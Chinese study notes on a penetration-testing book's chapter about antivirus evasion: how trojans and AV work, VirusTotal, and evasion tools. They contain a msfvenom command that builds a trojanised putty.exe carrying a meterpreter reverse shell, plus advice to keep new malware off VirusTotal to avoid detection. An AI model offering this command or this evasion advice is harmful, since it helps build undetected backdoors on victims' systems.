零 
1 这本书是2019年出版的，实际成书我估计在2014年甚至13年，因而该书说其免杀技术可行，这一点存疑。

2 在那个时代，内存马被视为免杀的救星，但是伴随着现在的行为监控技术的发展，内存马也不见得好。

3 在那个时代，社工已经是大头了。







一 12.1
（零）
1 木马程序的精确概念。

2 一版古早的vsftpd曾经被一个黑客植入过后门（植入的过程是该黑客攻破了vsftpd的服务器，拿到了vsftpd的源码，在植入后门后又使病毒程度覆盖源程序），这个vsftpd就成了木马，成了一个更大的backdoor。



（一）使用msf进行最基本的免杀
1 使用msfvenom将payload嵌入到正常程序中以形成木马：
（1）-x <宿主程序>
将payload嵌入到正常程序中。
（2）-k
确保宿主程序执行连贯性。

比如将病毒植入putty.exe：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x putty.exe -k -f exe -o p.exe

2 使用md5sum或者sha256sum等计算木马程序的哈希值，你会发现和源程序的（在官网上查看）不一样，这也是普通用户防御木马程序的手段。







二 12.2
1 防病毒软件的原理：
（1）静态分析。
（2）动态分析。

2 沙箱是一种隔离环境，用于安全地运行和测试程序或代码。它确保程序在受限的空间中运行，防止对系统或其他应用造成伤害。







三 12.3：Microsoft Security Essentials：对msf的查杀率还是挺高的







四 12.4：查杀网站：VT
1 https://www.virustotal.com/gui/home/upload

2 如果你的malvare是足够新的，那么请不要将之上传到vt，因为vt会向其使用的av引擎的背后厂商透露用户上传的malvare。







五 12.5：免杀技术（四种工具全是Windows环境的加壳法）
（一）msf编码



（二）交叉编译



（三）Hyperion加密



（四）Veil



（五）远在天边近在眼前的免杀方法：与其通过修改特征或加壳的方式处理原始病毒，不如从最底层开始自定义后门程序。